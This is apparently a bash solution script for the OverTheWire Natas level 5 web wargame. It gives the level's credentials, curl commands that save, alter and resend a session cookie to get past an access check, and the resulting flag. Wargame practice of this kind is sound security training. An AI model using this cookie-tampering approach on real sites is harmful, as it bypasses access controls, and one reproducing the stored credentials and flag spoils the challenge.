#!/bin/bash

 Username="natas5"
 Password="0n35PkggAPm2zbEpOU802c0x0Msn1ToK"

# URL:
 curl -s -u $Username:$Password http://natas5.natas.labs.overthewire.org

# Code:
# save the cookie session and modify it
# curl -s -c cockie -u $Username:$Password http://natas5.natas.labs.overthewire.org

# send the modified cookie
# curl -s -b cockie -u $Username:$Password http://natas5.natas.labs.overthewire.org

# Flag:
# 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
